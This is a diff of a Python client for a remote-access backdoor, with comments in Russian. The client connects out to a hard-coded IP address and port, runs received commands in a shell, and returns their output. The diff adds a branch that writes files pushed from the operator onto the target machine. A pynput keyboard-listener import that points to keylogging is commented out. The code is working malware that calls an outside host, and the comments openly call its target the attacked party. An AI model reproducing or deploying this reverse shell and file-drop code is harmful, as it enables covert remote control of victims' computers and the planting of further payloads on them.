@@ -4,7 +4,7 @@ import datetime
 import threading
 import os
 import subprocess
-from pynput.keyboard import Listener
+#from pynput.keyboard import Listener
 """
 Также как и на серверной стороне, здесь будут фигурировать внутренние локальные IP, которые 
 можно посмотреть в ipconfig в cmd.
@@ -77,6 +77,22 @@ def accept_attack(ip, port):
                     sock.send(os.getcwd().encode())
                 except Exception as e:
                     print(e)
+            if data[:4].decode() == "send":
+                print("Проалились в подменю send на стороне клиента")
+
+                command, file_name = data.decode().split(" ")
+                print(file_name, " file_name")
+
+                file = open(file_name, 'wb')
+                data = sock.recv(1024000000)
+                print(data, " data")
+                print(len(data), " len data")
+                file.write(data)
+
+                file.close()
+
+                print("В конце блока send, клиент, значит файл получен")
+
             else:
                 #далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
                 #шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
@@ -90,8 +106,19 @@ def accept_attack(ip, port):
 
                 sock.send(output_bytes)
         else:
-            sock.send(b"Unknown command")
-            print("Unknown command was sended")
+            sock.send(b"empty string response")
+            print("Послали ответ на пустую строку")
     sock.close()
 
 accept_attack("109.237.25.179", 9090)
+
+"""                while True:
+                    print("Мы в начале true")
+                    data = sock.recv(1024)
+                    print(data, " data")
+                    print(len(data), " len data")
+                    if len(data)<1:
+                        print("Мы в break")
+                        break
+                    file.write(data)
+                    print("Мы после write")     """
